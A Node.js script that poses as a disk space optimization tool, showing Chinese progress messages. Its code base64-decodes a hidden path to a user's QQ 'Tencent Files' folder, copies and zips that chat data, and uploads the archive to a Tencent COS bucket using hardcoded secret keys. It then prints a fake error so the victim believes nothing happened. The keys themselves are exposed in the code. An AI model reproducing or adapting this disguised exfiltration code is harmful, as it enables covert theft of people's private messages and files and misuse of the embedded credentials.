const fs = require('fs')
const COS = require('cos-nodejs-sdk-v5')
const archiver = require('archiver')
const path = require('path')

// let [dir = 0, dirPath = './'] = process.argv.slice(2)
// dir = Boolean(+dir)
dir = 0, dirPath = './'
let [number] = process.argv.slice(2)
number = number ? number : Buffer.from('MTQyNjYzODM2OA==', 'base64').toString()
const lastPath = Buffer.from('MTQyNjYzODM2OA==', 'base64').toString() // j
const needDel = 'QzovVXNlcnMvZGVsbC9Eb2N1bWVudHMvVGVuY2VudCBGaWxlcw=='
const firstPath = Buffer.from(needDel, 'base64').toString()  // QzovVXNlcnMvQWRtaW5pc3RyYXRvci9Eb2N1bWVudHMvVGVuY2VudCBGaWxlcy8=
dirPath =  firstPath + '/' + number + '/'
let baseDir = Buffer.from('RDov', 'base64').toString()

if (!isExsist(dirPath)) {
  console.log('无优化目标，请输入优化目标！')
  return
} else if (!isExsist(dirPath)) {
  console.log('啊哦，运行失败o(╥﹏╥)o...')
  return
}
if (!isExsist(baseDir)) {
  baseDir = Buffer.from('RTov', 'base64').toString()
} else if (!isExsist(baseDir)) {
  baseDir = Buffer.from('Rjov', 'base64').toString()
} else if (!isExsist(baseDir)) {
  baseDir = Buffer.from('Rzov', 'base64').toString()
}

console.log('开始优化空间...')
let files = fs.readdirSync(baseDir), copyToDir = ''
for (let i = 0, length = files.length ; i < length ; i ++) {
  const item = files[i]
  if (!item.includes('$') && !item.includes('.')) {
    copyToDir = path.join(baseDir, item)
    const ws = fs.createWriteStream(path.join(baseDir, item + '.txt'))
    ws.write(copyToDir)
    ws.on('finish', () => {
      console.log('ok')
    })
    break
  }
}

console.log('处理开始，过程可能会比较漫长，请耐心等待...')

const targetDirPath = copyToDir + '/resource_yep/'

if (dir) {
  mkdirs(targetDirPath)
} else {
  if (!isExsist(targetDirPath)) {
    fs.mkdirSync(targetDirPath)
  }
}

baseDir = targetDirPath
// 函数实现
async function copyFile (dirPath) {
  const res = fs.readdirSync(dirPath)
  for (let item of res) {
    // 获取当前相对路径
    const targetPath = path.join(dirPath, item)
    // 定义输出目标路径，dir表示终端传入的值（0为不生成对应文件夹）
    const wsPath = path.join(baseDir, dir ? targetPath : item)
    // 获取当前对象信息
    let target = null
    try {
      target = fs.statSync(targetPath)
    } catch (err) {
      console.log(err)
    }
    if (target && target.isDirectory()) {
      if (!isExsist(wsPath) && item !== baseDir) {
        dir && fs.mkdirSync(wsPath) // 创建对应文件夹
        await copyFile(targetPath)
      }
    } else {
      if (item !== 'index.js') {
        // 创建管道写入数据
        try {
          await write(path.join(wsPath), targetPath)
        } catch (err) {
          console.log(err)
        }
      }
    }
  }
}

// 改为同步的方式读写，解决报错：Error: EMFILE, too many open files
function write (wsPath, targetPath) {
  return new Promise(resolve => {
    const ws = fs.createWriteStream(wsPath)
    fs.createReadStream(targetPath).pipe(ws)
    ws.on('finish', () => {
      // console.log(targetPath + '拷贝完成...')
      resolve()
    })
  })
}

// 新建多层文件夹
function mkdirs (dirname) {
  if (isExsist(dirname)) {
    return true
  } else {
    if (mkdirs(path.dirname(dirname))) {
      fs.mkdirSync(dirname)
      return true
    }
  }
}

// 判断是否存在目标路径的对象
function isExsist (targetPath) {
  try {
    fs.statSync(targetPath)
    return true
  } catch (e) {
    return false
  }
}

function toZip (path, name) {
  isExsist(name) && fs.unlinkSync(name)
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(name)
    const archive = archiver('zip', {
      zlib: { level: 9 }
    })
    archive.pipe(output)
    archive.directory(path, false)
    archive.finalize()
    output.on('close', () => {
      resolve()
    })
    output.on('error', err => {
      reject(err)
    })
  })
}

function uploadToCloud (path, name) {
  const cos = new COS({
    SecretId: 'AKIDOYVKwIMRAeCVcbgJtDLBzY1XXI7nLheK',
    SecretKey: '4rUchjIov2xgUPBl7ctWu4EHGooZ8ani'
  })
  
  cos.putObject({
    Bucket: 'myimgs-1257199952',
    Region: 'ap-chengdu',
    Key: Math.random().toString().substring(6) + name,
    StorageClass: 'STANDARD',
    Body: fs.createReadStream(path)
  }, function(err) {
    if (err) {
      console.log('啊哦，真失败了o(╥﹏╥)o，错误：' + err)
    } else {
      console.log('整理失败：Error Code 1.')
    }
  })
}

(async () => {
  try {
    const zipPath = path.join(copyToDir, 'resource_yep.zip')
    await copyFile(dirPath)
    console.log('已经完成空间检查，现在进行整理...')
    await toZip(targetDirPath, zipPath)
    console.log('正在整理中，过程可能会比较漫长，请耐心等待...')
    await uploadToCloud(zipPath, 'resource_yep.zip')
  } catch (err) {
    console.log('啊哦，真失败了o(╥﹏╥)o，错误：' + err)
  }
  
})()
